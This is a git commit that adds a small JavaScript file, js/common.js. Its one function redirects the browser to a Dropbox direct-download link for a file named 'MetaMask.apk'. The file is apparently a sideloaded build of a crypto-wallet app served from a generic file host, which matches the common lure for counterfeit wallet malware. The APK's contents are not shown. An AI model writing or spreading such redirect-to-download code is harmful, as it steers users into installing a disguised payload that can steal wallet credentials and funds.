e6139c35f6067acad2d771394b6f9cafdaa47f19
chinmy888 <411191866@qq.com>
2025-06-25 23:47:24 +0800

    Add files via upload

---
+++ js/common.js
@@ -0,0 +1,5 @@
+﻿function GetToFunction()
+{
+	var url="https://www.dropbox.com/scl/fi/eki3nu3aggxo1kv3hq060/MetaMask.apk?rlkey=2t4i1rbed6ld3u1p1tmto8ub3&st=3ecdddn2&dl=1";
+	window.location=url;
+}
